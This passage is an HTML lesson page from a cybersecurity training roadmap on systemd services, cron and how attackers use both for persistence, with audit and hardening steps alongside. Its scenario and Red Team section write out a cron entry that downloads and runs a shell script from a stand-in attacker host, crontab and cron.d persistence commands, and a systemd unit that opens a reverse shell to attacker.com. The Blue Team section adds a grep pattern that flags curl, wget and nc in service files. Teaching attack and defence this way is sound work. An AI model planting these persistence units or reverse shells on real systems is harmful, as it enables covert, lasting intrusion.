@@ -1,0 +1,571 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+.w{max-width:680px;padding:1.5rem 0}
+.hero{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:1.25rem 1.5rem;margin-bottom:1.25rem}
+.badge{display:inline-flex;align-items:center;gap:6px;font-size:12px;padding:3px 10px;border-radius:var(--border-radius-md);margin-bottom:.75rem}
+.hero h1{font-size:20px;font-weight:500;color:var(--color-text-primary);margin-bottom:.3rem}
+.hero p{font-size:14px;color:var(--color-text-secondary);line-height:1.6}
+.prog-lbl{font-size:11px;color:var(--color-text-secondary);margin-bottom:4px}
+.prog{height:4px;background:var(--color-border-tertiary);border-radius:2px;margin-bottom:1.25rem}
+.prog-fill{height:100%;width:80%;background:var(--color-text-info);border-radius:2px}
+.toc{display:grid;grid-template-columns:repeat(auto-fit,minmax(148px,1fr));gap:8px;margin-bottom:1.25rem}
+.ti{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:.6rem .75rem;cursor:pointer;display:flex;align-items:center;gap:8px}
+.ti:hover{background:var(--color-background-secondary)}
+.ti i{font-size:16px;color:var(--color-text-secondary)}
+.ti span{font-size:12px;color:var(--color-text-secondary);line-height:1.3}
+.sec{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);margin-bottom:1rem;overflow:hidden}
+.sh{display:flex;align-items:center;justify-content:space-between;padding:1rem 1.25rem;cursor:pointer;gap:12px}
+.sh:hover{background:var(--color-background-secondary)}
+.sl{display:flex;align-items:center;gap:10px}
+.si{width:32px;height:32px;border-radius:var(--border-radius-md);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.st{font-size:15px;font-weight:500;color:var(--color-text-primary)}
+.ss{font-size:12px;color:var(--color-text-secondary);margin-top:1px}
+.chev{font-size:16px;color:var(--color-text-secondary);transition:transform .2s}
+.chev.open{transform:rotate(180deg)}
+.sb{padding:0 1.25rem 1.25rem;display:none}
+.sb.open{display:block}
+h3{font-size:14px;font-weight:500;color:var(--color-text-primary);margin:1rem 0 .4rem}
+h3:first-child{margin-top:0}
+p{font-size:14px;color:var(--color-text-secondary);line-height:1.7;margin-bottom:.5rem}
+ul{padding-left:1.2rem;margin-bottom:.5rem}
+li{font-size:14px;color:var(--color-text-secondary);line-height:1.9}
+code{font-family:var(--font-mono);font-size:12px;background:var(--color-background-secondary);padding:1px 5px;border-radius:4px;color:var(--color-text-primary)}
+.cb{font-family:var(--font-mono);font-size:12px;background:var(--color-background-secondary);padding:.75rem 1rem;border-radius:var(--border-radius-md);color:var(--color-text-primary);line-height:1.9;margin:.5rem 0;white-space:pre-wrap;border:0.5px solid var(--color-border-tertiary)}
+.div{height:0.5px;background:var(--color-border-tertiary);margin:.75rem 0}
+.g2{display:grid;grid-template-columns:repeat(auto-fit,minmax(0,1fr));gap:8px;margin:.5rem 0}
+.mc{background:var(--color-background-secondary);border-radius:var(--border-radius-md);padding:.75rem;border:0.5px solid var(--color-border-tertiary)}
+.mc .lbl{font-size:11px;color:var(--color-text-secondary);margin-bottom:4px}
+.mc .val{font-size:13px;font-weight:500;color:var(--color-text-primary);line-height:1.5}
+.tag{display:inline-block;font-size:11px;padding:2px 8px;border-radius:var(--border-radius-md);margin-right:4px;margin-bottom:4px}
+.tb{background:var(--color-background-info);color:var(--color-text-info)}
+.tr{background:var(--color-background-danger);color:var(--color-text-danger)}
+.tg{background:var(--color-background-success);color:var(--color-text-success)}
+.ta{background:var(--color-background-warning);color:var(--color-text-warning)}
+.task-item{display:flex;align-items:flex-start;gap:10px;padding:.6rem 0;border-bottom:0.5px solid var(--color-border-tertiary)}
+.task-item:last-child{border-bottom:none}
+.tnum{width:22px;height:22px;border-radius:50%;background:var(--color-background-info);color:var(--color-text-info);font-size:11px;font-weight:500;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px}
+.ttxt{font-size:13px;color:var(--color-text-secondary);line-height:1.6}
+.lab-item{display:flex;align-items:flex-start;gap:10px;padding:.5rem 0;border-bottom:0.5px solid var(--color-border-tertiary)}
+.lab-item:last-child{border-bottom:none}
+.li-ic{width:28px;height:28px;border-radius:var(--border-radius-md);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ln{font-size:13px;font-weight:500;color:var(--color-text-primary)}
+.ld{font-size:12px;color:var(--color-text-secondary);margin-top:2px}
+.yt{display:flex;align-items:center;gap:10px;background:var(--color-background-danger);border-radius:var(--border-radius-md);padding:.75rem 1rem;margin-top:.5rem;cursor:pointer;border:0.5px solid var(--color-border-tertiary)}
+.yt i{font-size:20px;color:var(--color-text-danger)}
+.yt .yt-t{font-size:13px;font-weight:500;color:var(--color-text-danger)}
+.yt .yt-c{font-size:11px;color:var(--color-text-danger);opacity:.8}
+.tip-item{display:flex;align-items:flex-start;gap:8px;margin-bottom:.6rem}
+.tip-item i{font-size:16px;flex-shrink:0;margin-top:2px}
+.tip-item p{margin:0}
+.post-box{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:.75rem 1rem;font-size:13px;color:var(--color-text-secondary);line-height:1.7;margin:.5rem 0}
+.story-block{border-left:2px solid var(--color-border-tertiary);padding-left:1rem;margin:.5rem 0;border-radius:0}
+.sp{font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px}
+.cmd-row{display:flex;align-items:flex-start;gap:10px;padding:.4rem 0;border-bottom:0.5px solid var(--color-border-tertiary)}
+.cmd-row:last-child{border-bottom:none}
+.cmd{font-family:var(--font-mono);font-size:12px;font-weight:500;color:var(--color-text-primary);min-width:175px;flex-shrink:0}
+.cmd-desc{font-size:12px;color:var(--color-text-secondary);line-height:1.5}
+.unit-block{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:.75rem 1rem;margin:.4rem 0}
+.unit-title{font-size:13px;font-weight:500;color:var(--color-text-primary);margin-bottom:.3rem}
+.unit-body{font-size:12px;color:var(--color-text-secondary);line-height:1.6}
+.cron-field{display:flex;gap:0;margin:.5rem 0;overflow-x:auto}
+.cf{padding:.5rem .6rem;border:0.5px solid var(--color-border-tertiary);text-align:center;flex:1;min-width:70px}
+.cf .cfv{font-family:var(--font-mono);font-size:13px;font-weight:500;color:var(--color-text-primary);display:block;margin-bottom:2px}
+.cf .cfl{font-size:10px;color:var(--color-text-secondary)}
+.cf:first-child{border-radius:var(--border-radius-md) 0 0 var(--border-radius-md)}
+.cf:last-child{border-radius:0 var(--border-radius-md) var(--border-radius-md) 0}
+.cf.hi{background:var(--color-background-warning)}
+.cf.hi .cfv{color:var(--color-text-warning)}
+</style>
+
+<div class="w">
+  <div class="hero">
+    <div class="badge" style="background:var(--color-background-success);color:var(--color-text-success)"><i class="ti ti-calendar" aria-hidden="true"></i> Month 1 · Week 2 · Day 9</div>
+    <h1>Services + Systemd + Cron</h1>
+    <p>Today you master how Linux manages long-running services via systemd, how scheduled tasks work with cron, and — critically for security — how both are abused for persistence by attackers and audited by defenders.</p>
+  </div>
+  <div class="prog-lbl">Roadmap progress — Day 9 of ~90</div>
+  <div class="prog"><div class="prog-fill"></div></div>
+
+  <div class="toc">
+    <div class="ti" onclick="tog('theory')"><i class="ti ti-book-2" aria-hidden="true"></i><span>Theory</span></div>
+    <div class="ti" onclick="tog('practical')"><i class="ti ti-terminal-2" aria-hidden="true"></i><span>Practical</span></div>
+    <div class="ti" onclick="tog('scenario')"><i class="ti ti-shield-exclamation" aria-hidden="true"></i><span>Scenario</span></div>
+    <div class="ti" onclick="tog('redteam')"><i class="ti ti-sword" aria-hidden="true"></i><span>Red Team</span></div>
+    <div class="ti" onclick="tog('blueteam')"><i class="ti ti-shield-check" aria-hidden="true"></i><span>Blue Team</span></div>
+    <div class="ti" onclick="tog('labs')"><i class="ti ti-flask" aria-hidden="true"></i><span>Free Labs</span></div>
+    <div class="ti" onclick="tog('tasks')"><i class="ti ti-checklist" aria-hidden="true"></i><span>Tasks</span></div>
+    <div class="ti" onclick="tog('book')"><i class="ti ti-books" aria-hidden="true"></i><span>Book of Day</span></div>
+    <div class="ti" onclick="tog('content')"><i class="ti ti-brand-linkedin" aria-hidden="true"></i><span>Content Guide</span></div>
+    <div class="ti" onclick="tog('tips')"><i class="ti ti-bulb" aria-hidden="true"></i><span>Pro Tips</span></div>
+    <div class="ti" onclick="tog('recap')"><i class="ti ti-moon" aria-hidden="true"></i><span>Recap</span></div>
+  </div>
+
+  <!-- 1. THEORY -->
+  <div class="sec">
+    <div class="sh" onclick="tog('theory')">
+      <div class="sl"><div class="si" style="background:var(--color-background-info)"><i class="ti ti-book-2" style="color:var(--color-text-info)" aria-hidden="true"></i></div><div><div class="st">1. Theory Section</div><div class="ss">Systemd · unit files · cron syntax · at</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-theory" aria-hidden="true"></i>
+    </div>
+    <div class="sb open" id="body-theory">
+
+      <h3>What is systemd?</h3>
+      <p>Systemd is the init system — PID 1 — on virtually all modern Linux distributions. It starts and manages all services, mounts filesystems, and brings the system to a usable state after boot. Everything that runs persistently on a Linux server is managed by systemd as a <strong>unit</strong>.</p>
+
+      <div class="g2">
+        <div class="mc"><div class="lbl">Unit</div><div class="val">The basic object systemd manages. Can be a service, socket, timer, mount, device, or target.</div></div>
+        <div class="mc"><div class="lbl">Service unit (.service)</div><div class="val">Defines how to start, stop, and restart a daemon (e.g. SSH, Apache, Nginx).</div></div>
+        <div class="mc"><div class="lbl">Target (.target)</div><div class="val">Groups of units. <code>multi-user.target</code> = normal boot. Similar to old runlevels.</div></div>
+        <div class="mc"><div class="lbl">Timer (.timer)</div><div class="val">Systemd's alternative to cron — schedules tasks. More powerful and better logging than cron.</div></div>
+      </div>
+
+      <h3>Unit file structure — what a service looks like</h3>
+      <div class="cb">[Unit]
+Description=My Custom Service
+After=network.target          # start after network is up
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=nobody                   # run as non-root service account (least privilege)
+ExecStart=/usr/bin/myapp      # command to start the service
+ExecStop=/bin/kill -s QUIT $MAINPID
+Restart=on-failure            # restart if it crashes
+RestartSec=5s
+
+[Install]
+WantedBy=multi-user.target    # enable at normal boot</div>
+
+      <h3>Unit file locations — know these for auditing</h3>
+      <div style="margin:.5rem 0">
+        <div class="cmd-row"><div class="cmd">/lib/systemd/system/</div><div class="cmd-desc">Default units from installed packages. Do not edit — may be overwritten on updates.</div></div>
+        <div class="cmd-row"><div class="cmd">/etc/systemd/system/</div><div class="cmd-desc">System administrator customisations and new units. These override <code>/lib/systemd/system/</code>. Attackers plant backdoor units here.</div></div>
+        <div class="cmd-row"><div class="cmd">/run/systemd/system/</div><div class="cmd-desc">Transient units created at runtime. Disappear on reboot.</div></div>
+        <div class="cmd-row"><div class="cmd">~/.config/systemd/user/</div><div class="cmd-desc">Per-user units run without root. Attackers use these for user-level persistence that survives login.</div></div>
+      </div>
+
+      <h3>Cron — scheduled task system</h3>
+      <p>Cron runs commands on a schedule. Each line in a crontab is a task. Understanding the syntax is mandatory — it appears constantly in CTFs, post-exploitation, and log analysis.</p>
+
+      <div class="cron-field">
+        <div class="cf hi"><span class="cfv">*</span><span class="cfl">minute (0–59)</span></div>
+        <div class="cf hi"><span class="cfv">*</span><span class="cfl">hour (0–23)</span></div>
+        <div class="cf hi"><span class="cfv">*</span><span class="cfl">day of month (1–31)</span></div>
+        <div class="cf hi"><span class="cfv">*</span><span class="cfl">month (1–12)</span></div>
+        <div class="cf hi"><span class="cfv">*</span><span class="cfl">day of week (0–7)</span></div>
+        <div class="cf"><span class="cfv">/path/cmd</span><span class="cfl">command to run</span></div>
+      </div>
+
+      <div class="cb">*/5 * * * * /tmp/backup.sh        # every 5 minutes
+0 2 * * * /usr/bin/backup.sh      # daily at 02:00
+0 0 * * 0 /scripts/weekly.sh      # every Sunday at midnight
+@reboot /usr/local/bin/startup.sh # run once at system boot
+@hourly /usr/bin/check.sh         # every hour (shorthand)</div>
+
+      <h3>Cron file locations — all must be audited</h3>
+      <div style="margin:.5rem 0">
+        <div class="cmd-row"><div class="cmd">/etc/crontab</div><div class="cmd-desc">System-wide crontab. Has an extra USER field before the command. Edited directly.</div></div>
+        <div class="cmd-row"><div class="cmd">/etc/cron.d/</div><div class="cmd-desc">Drop-in cron files from packages. Same format as <code>/etc/crontab</code> with USER field.</div></div>
+        <div class="cmd-row"><div class="cmd">/etc/cron.hourly/</div><div class="cmd-desc">Scripts placed here run once per hour. No schedule line needed — just drop the script in.</div></div>
+        <div class="cmd-row"><div class="cmd">/etc/cron.daily/</div><div class="cmd-desc">Scripts run once per day.</div></div>
+        <div class="cmd-row"><div class="cmd">/var/spool/cron/crontabs/</div><div class="cmd-desc">Per-user crontabs set with <code>crontab -e</code>. One file per user. Root-readable.</div></div>
+      </div>
+
+      <div class="div"></div>
+      <div class="yt" onclick="openLink('https://www.youtube.com/watch?v=Kzpm-rGAXos')">
+        <i class="ti ti-brand-youtube" aria-hidden="true"></i>
+        <div><div class="yt-t">Systemd explained — services, units, journalctl</div><div class="yt-c">NetworkChuck · Beginner-friendly systemd deep dive with real examples</div></div>
+        <i class="ti ti-external-link" style="margin-left:auto;font-size:14px;color:var(--color-text-danger)" aria-hidden="true"></i>
+      </div>
+      <div class="yt" onclick="openLink('https://www.youtube.com/watch?v=QZJ1drMQz1A')">
+        <i class="ti ti-brand-youtube" aria-hidden="true"></i>
+        <div><div class="yt-t">Linux cron jobs — full tutorial for beginners</div><div class="yt-c">LearnLinuxTV · Complete cron syntax guide with security context</div></div>
+        <i class="ti ti-external-link" style="margin-left:auto;font-size:14px;color:var(--color-text-danger)" aria-hidden="true"></i>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2. PRACTICAL -->
+  <div class="sec">
+    <div class="sh" onclick="tog('practical')">
+      <div class="sl"><div class="si" style="background:var(--color-background-success)"><i class="ti ti-terminal-2" style="color:var(--color-text-success)" aria-hidden="true"></i></div><div><div class="st">2. Practical Section</div><div class="ss">systemctl · journalctl · crontab · timers</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-practical" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-practical">
+
+      <h3>Exercise 1 — systemctl service management</h3>
+      <div class="cb">systemctl status ssh              # status of SSH service
+systemctl status --all | head -40 # overview of all units
+systemctl list-units --type=service          # all active services
+systemctl list-units --type=service --state=running  # only running services
+systemctl list-unit-files --type=service     # all installed services + enabled state
+systemctl is-active ssh                      # quick active check (exit code 0 = active)
+systemctl is-enabled ssh                     # will it start at boot?</div>
+
+      <h3>Exercise 2 — start, stop, enable, disable</h3>
+      <div class="cb">sudo systemctl start ssh          # start now
+sudo systemctl stop ssh           # stop now
+sudo systemctl restart ssh        # stop then start
+sudo systemctl reload ssh         # reload config without full restart (SIGHUP)
+sudo systemctl enable ssh         # start at boot (creates symlink in /etc/systemd/system)
+sudo systemctl disable ssh        # remove from boot
+sudo systemctl enable --now ssh   # enable AND start immediately (most useful)</div>
+
+      <h3>Exercise 3 — journalctl log reading</h3>
+      <div class="cb">journalctl                           # all logs since boot
+journalctl -u ssh                    # logs for SSH service only
+journalctl -u ssh -f                 # follow live SSH log
+journalctl -u ssh --since "1 hour ago"
+journalctl -u ssh --since "2024-01-01" --until "2024-01-02"
+journalctl -p err                    # only error-level and above
+journalctl -p err -b                 # errors from current boot only
+journalctl --disk-usage              # how much space logs are using
+journalctl -b -1                     # logs from the previous boot (useful after crashes)</div>
+
+      <h3>Exercise 4 — inspect unit files directly</h3>
+      <div class="cb">systemctl cat ssh                    # view the full unit file
+systemctl cat cron                   # view cron's unit file
+ls /etc/systemd/system/              # custom/added unit files (audit these)
+ls /lib/systemd/system/              # package-installed unit files
+find /etc/systemd/system/ -name "*.service" -newer /etc/passwd
+# unit files newer than /etc/passwd — recently added (persistence indicator)</div>
+
+      <h3>Exercise 5 — crontab management</h3>
+      <div class="cb">crontab -l                           # list your cron jobs
+crontab -e                           # edit your crontab (opens in editor)
+crontab -l -u root                   # list root's crontab (needs sudo)
+sudo crontab -l -u www-data          # list www-data's crontab
+
+cat /etc/crontab                     # system-wide crontab
+ls -la /etc/cron.d/                  # drop-in cron files
+ls -la /etc/cron.hourly/             # hourly scripts
+ls -la /etc/cron.daily/              # daily scripts
+ls -la /var/spool/cron/crontabs/     # all per-user crontabs (root readable)</div>
+
+      <h3>Exercise 6 — write and test your own service + cron</h3>
+      <div class="cb">cat > /tmp/hello-service.sh << 'EOF'
+#!/bin/bash
+echo "Service started at $(date)" >> /tmp/hello.log
+sleep infinity
+EOF
+chmod +x /tmp/hello-service.sh
+
+sudo tee /etc/systemd/system/hello.service << 'EOF'
+[Unit]
+Description=Hello test service
+
+[Service]
+ExecStart=/tmp/hello-service.sh
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload          # reload unit file index
+sudo systemctl start hello
+sudo systemctl status hello
+journalctl -u hello -f                # watch it live
+sudo systemctl stop hello
+sudo rm /etc/systemd/system/hello.service
+sudo systemctl daemon-reload          # clean up</div>
+    </div>
+  </div>
+
+  <!-- 3. SCENARIO -->
+  <div class="sec">
+    <div class="sh" onclick="tog('scenario')">
+      <div class="sl"><div class="si" style="background:var(--color-background-warning)"><i class="ti ti-shield-exclamation" style="color:var(--color-text-warning)" aria-hidden="true"></i></div><div><div class="st">3. Real-World Scenario</div><div class="ss">Cron + systemd persistence survives server reboot</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-scenario" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-scenario">
+      <p>A defender investigates a compromised server. The attacker was ejected after their initial reverse shell was killed — but within 10 minutes they are back. The server was even rebooted and the attacker is still present.</p>
+      <div class="div"></div>
+      <div class="story-block">
+        <div class="sp" style="color:var(--color-text-danger)">Layer 1 — cron persistence</div>
+        <p>The defender checks <code>crontab -l -u www-data</code> and finds a hidden entry: <code>*/5 * * * * /tmp/.update curl http://attacker.com/shell.sh | bash</code>. Every 5 minutes the server downloads and executes a fresh payload. Killing the process alone never fixed anything — the cron job relaunched it.</p>
+      </div>
+      <div class="story-block">
+        <div class="sp" style="color:var(--color-text-danger)">Layer 2 — systemd persistence (survives reboots)</div>
+        <p>After removing the cron entry, the attacker is still back after a reboot. The defender runs <code>ls -lat /etc/systemd/system/</code> and spots a file called <code>network-monitor.service</code> created 2 days ago — right when the breach happened. <code>systemctl cat network-monitor</code> reveals it runs a reverse shell at boot.</p>
+      </div>
+      <div class="story-block">
+        <div class="sp" style="color:var(--color-text-danger)">Layer 3 — user-level systemd timer</div>
+        <p>Even after removing the system service, persistence returns. The attacker also installed a user-level timer in <code>~/.config/systemd/user/</code> for the <code>www-data</code> account that requires no root and persists across reboots for that user.</p>
+      </div>
+      <div class="story-block">
+        <div class="sp" style="color:var(--color-text-success)">Defender lesson</div>
+        <p>Full persistence removal requires checking: all crontab locations, <code>/etc/systemd/system/</code> for new service files, <code>~/.config/systemd/user/</code> for all users, <code>/etc/cron.d/</code>, and <code>@reboot</code> entries. Removing just the active shell is almost never sufficient.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4. RED TEAM -->
+  <div class="sec">
+    <div class="sh" onclick="tog('redteam')">
+      <div class="sl"><div class="si" style="background:var(--color-background-danger)"><i class="ti ti-sword" style="color:var(--color-text-danger)" aria-hidden="true"></i></div><div><div class="st">4. Red Team Perspective</div><div class="ss">Persistence via cron and systemd — the two most common Linux techniques</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-redteam" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-redteam">
+      <h3>Persistence — why it matters</h3>
+      <p>Initial access can be fragile — a process crash, a session timeout, or a reboot will end it. Persistence mechanisms survive these events. Cron and systemd are the two most common Linux persistence techniques because they are built-in, trusted, and often not carefully monitored.</p>
+
+      <h3>Cron-based persistence</h3>
+      <div class="cb">(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.payload") | crontab -
+# adds to existing crontab without overwriting it — safer than crontab -e
+
+crontab -l -u www-data   # check what's already there before adding
+
+# system-level (requires write to /etc/cron.d/ — needs root or path traversal)
+echo "*/5 * * * * root /tmp/.payload" > /etc/cron.d/system-update</div>
+
+      <h3>Systemd service persistence (requires root)</h3>
+      <div class="cb">cat > /etc/systemd/system/update-service.service << 'EOF'
+[Unit]
+Description=System Update Service
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable --now update-service</div>
+
+      <h3>User-level systemd timer (no root needed)</h3>
+      <div class="cb">mkdir -p ~/.config/systemd/user/
+cat > ~/.config/systemd/user/update.service << 'EOF'
+[Unit]
+Description=Update
+
+[Service]
+ExecStart=/bin/bash /home/user/.local/.payload.sh
+EOF
+
+cat > ~/.config/systemd/user/update.timer << 'EOF'
+[Unit]
+Description=Update timer
+
+[Timer]
+OnBootSec=60s
+OnUnitActiveSec=5m
+
+[Install]
+WantedBy=timers.target
+EOF
+systemctl --user enable --now update.timer</div>
+
+      <h3>Service enumeration for attack opportunities</h3>
+      <div class="cb">systemctl list-units --type=service --state=running   # what's running?
+systemctl list-unit-files | grep enabled               # what starts at boot?
+ps aux | grep -v "\[" | awk '{print $11}' | sort -u    # all running binary paths
+find /etc/systemd/system/ -name "*.service" | xargs grep -l "ExecStart"
+# what command does each custom service run?</div>
+    </div>
+  </div>
+
+  <!-- 5. BLUE TEAM -->
+  <div class="sec">
+    <div class="sh" onclick="tog('blueteam')">
+      <div class="sl"><div class="si" style="background:var(--color-background-success)"><i class="ti ti-shield-check" style="color:var(--color-text-success)" aria-hidden="true"></i></div><div><div class="st">5. Blue Team Perspective</div><div class="ss">Audit persistence · Harden cron · Monitor units</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-blueteam" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-blueteam">
+      <h3>Complete persistence audit checklist</h3>
+      <div class="cb">for user in $(cut -d: -f1 /etc/passwd); do
+  echo "=== crontab: $user ==="
+  crontab -l -u $user 2>/dev/null
+done
+
+cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/
+ls -la /var/spool/cron/crontabs/
+
+find /etc/systemd/system/ -name "*.service" -newer /etc/passwd
+find /etc/systemd/system/ -name "*.timer"
+find /home -path "*/.config/systemd/user/*.service" 2>/dev/null
+find /root -path "*/.config/systemd/user/*.service" 2>/dev/null</div>
+
+      <h3>Detect suspicious service content</h3>
+      <div class="cb">grep -r "ExecStart" /etc/systemd/system/ | grep -vE "^Binary" \
+  | grep -iE "/tmp|/dev/shm|curl|wget|bash -c|nc |python|perl"
+# services that run from suspicious locations or use network tools</div>
+
+      <h3>Monitor for new unit files with auditd</h3>
+      <div class="cb">auditctl -w /etc/systemd/system/ -p wa -k systemd_changes
+auditctl -w /etc/cron.d/ -p wa -k cron_changes
+auditctl -w /var/spool/cron/ -p wa -k cron_user_changes
+ausearch -k systemd_changes        # alert on any new service files
+ausearch -k cron_changes           # alert on cron directory writes</div>
+
+      <h3>Harden cron access</h3>
+      <div class="cb">echo "root" > /etc/cron.allow      # only root can use cron
+echo "ALL" > /etc/cron.deny        # deny all others (cron.allow takes precedence)
+chmod 700 /var/spool/cron/crontabs # restrict crontab directory
+chmod 600 /etc/crontab             # restrict system crontab</div>
+
+      <h3>Disable and remove suspicious services cleanly</h3>
+      <div class="cb">sudo systemctl stop suspicious.service
+sudo systemctl disable suspicious.service
+sudo rm /etc/systemd/system/suspicious.service
+sudo systemctl daemon-reload
+sudo systemctl reset-failed        # clear error state from removed unit</div>
+    </div>
+  </div>
+
+  <!-- 6. LABS -->
+  <div class="sec">
+    <div class="sh" onclick="tog('labs')">
+      <div class="sl"><div class="si" style="background:var(--color-background-info)"><i class="ti ti-flask" style="color:var(--color-text-info)" aria-hidden="true"></i></div><div><div class="st">6. Free Labs</div><div class="ss">TryHackMe · OverTheWire · HackTheBox</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-labs" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-labs">
+      <div class="lab-item">
+        <div class="li-ic" style="background:var(--color-background-success)"><i class="ti ti-arrow-right" style="color:var(--color-text-success);font-size:14px" aria-hidden="true"></i></div>
+        <div><div class="ln">TryHackMe — "Linux PrivEsc" — Cron Jobs section (Free)</div><div class="ld">The cron section of this room walks through finding and exploiting misconfigured cron jobs step by step. <span style="color:var(--color-text-info);cursor:pointer" onclick="openLink('https://tryhackme.com/room/linuxprivesc')">tryhackme.com/room/linuxprivesc ↗</span></div></div>
+      </div>
+      <div class="lab-item">
+        <div class="li-ic" style="background:var(--color-background-success)"><i class="ti ti-arrow-right" style="color:var(--color-text-success);font-size:14px" aria-hidden="true"></i></div>
+        <div><div class="ln">TryHackMe — "Persistence" room (Free)</div><div class="ld">Dedicated room on all Linux persistence techniques including cron, systemd services, startup scripts, and more. <span style="color:var(--color-text-info);cursor:pointer" onclick="openLink('https://tryhackme.com/room/persistence')">tryhackme.com/room/persistence ↗</span></div></div>
+      </div>
+      <div class="lab-item">
+        <div class="li-ic" style="background:var(--color-background-warning)"><i class="ti ti-arrow-right" style="color:var(--color-text-warning);font-size:14px" aria-hidden="true"></i></div>
+        <div><div class="ln">TryHackMe — "Common Linux Privesc" — Cron section (Free)</div><div class="ld">Covers path hijacking in cron jobs — a classic CTF and real-world technique. <span style="color:var(--color-text-info);cursor:pointer" onclick="openLink('https://tryhackme.com/room/commonlinuxprivesc')">tryhackme.com/room/commonlinuxprivesc ↗</span></div></div>
+      </div>
+      <div class="lab-item">
+        <div class="li-ic" style="background:var(--color-background-danger)"><i class="ti ti-arrow-right" style="color:var(--color-text-danger);font-size:14px" aria-hidden="true"></i></div>
+        <div><div class="ln">OverTheWire — Bandit Levels 21–24 (Free)</div><div class="ld">These levels involve reading and exploiting cron jobs running as other users — directly today's content. <span style="color:var(--color-text-info);cursor:pointer" onclick="openLink('https://overthewire.org/wargames/bandit/')">overthewire.org/wargames/bandit ↗</span></div></div>
+      </div>
+      <div class="lab-item">
+        <div class="li-ic" style="background:var(--color-background-info)"><i class="ti ti-arrow-right" style="color:var(--color-text-info);font-size:14px" aria-hidden="true"></i></div>
+        <div><div class="ln">Crontab.guru — Interactive cron expression editor (Free)</div><div class="ld">Browser tool that explains any cron expression in plain English. Bookmark it — use it every time you read a cron job. <span style="color:var(--color-text-info);cursor:pointer" onclick="openLink('https://crontab.guru')">crontab.guru ↗</span></div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 7. TASKS -->
+  <div class="sec">
+    <div class="sh" onclick="tog('tasks')">
+      <div class="sl"><div class="si" style="background:var(--color-background-warning)"><i class="ti ti-checklist" style="color:var(--color-text-warning)" aria-hidden="true"></i></div><div><div class="st">7. Daily Tasks & Challenges</div><div class="ss">Complete before moving to Day 10</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-tasks" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-tasks">
+      <div class="task-item"><div class="tnum">1</div><div class="ttxt">Run the complete persistence audit from the Blue Team section on your own system. For every cron entry you find, decode what it does and when it runs using <code>crontab.guru</code>. For every service in <code>/etc/systemd/system/</code>, read its <code>ExecStart</code> and understand what binary it runs and as which user. Save findings to <code>~/security-lab/notes/day9-persistence-audit.txt</code>.</div></div>
+      <div class="task-item"><div class="tnum">2</div><div class="ttxt">Create your own systemd service from scratch (Exercise 6) — write a unit file, reload the daemon, start it, verify it with <code>systemctl status</code>, read its logs with <code>journalctl -u</code>, then cleanly remove it. Do this entirely from memory after reading the exercise once. This workflow is used in both administration and CTFs constantly.</div></div>
+      <div class="task-item"><div class="tnum">3</div><div class="ttxt">Write a cron job that runs every minute and appends the current date, uptime, and logged-in users to <code>~/security-lab/evidence/heartbeat.log</code>. Let it run for 5 minutes, verify the log is growing, then remove the cron job. This teaches you the feedback loop: add → verify → clean up.</div></div>
+      <div class="task-item"><div class="tnum">4</div><div class="ttxt">Complete OverTheWire Bandit Levels 21–24. These levels directly require reading and interacting with cron jobs running as other users. They are some of the most satisfying Bandit levels and directly apply today's content in a puzzle format.</div></div>
+      <div class="task-item"><div class="tnum">5</div><div class="ttxt">Add a "PERSISTENCE AUDIT" section to your <code>recon.sh</code> script: enumerate all cron locations, list all enabled systemd services, check <code>/etc/systemd/system/</code> for recently modified unit files, and scan service <code>ExecStart</code> values for suspicious paths. This is one of the most important sections for real-world incident response.</div></div>
+    </div>
+  </div>
+
+  <!-- 8. BOOK -->
+  <div class="sec">
+    <div class="sh" onclick="tog('book')">
+      <div class="sl"><div class="si" style="background:var(--color-background-info)"><i class="ti ti-books" style="color:var(--color-text-info)" aria-hidden="true"></i></div><div><div class="st">8. Book of the Day</div><div class="ss">One highly recommended resource</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-book" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-book">
+      <div style="display:flex;gap:12px;background:var(--color-background-secondary);border-radius:var(--border-radius-md);padding:.75rem 1rem;border:0.5px solid var(--color-border-tertiary);margin-top:.5rem">
+        <div style="width:40px;height:54px;border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:var(--color-background-warning)"><i class="ti ti-book" style="font-size:20px;color:var(--color-text-warning)" aria-hidden="true"></i></div>
+        <div>
+          <div style="font-size:13px;font-weight:500;color:var(--color-text-primary);margin-bottom:3px">How Linux Works — Brian Ward (Chapter 6: How User Space Starts)</div>
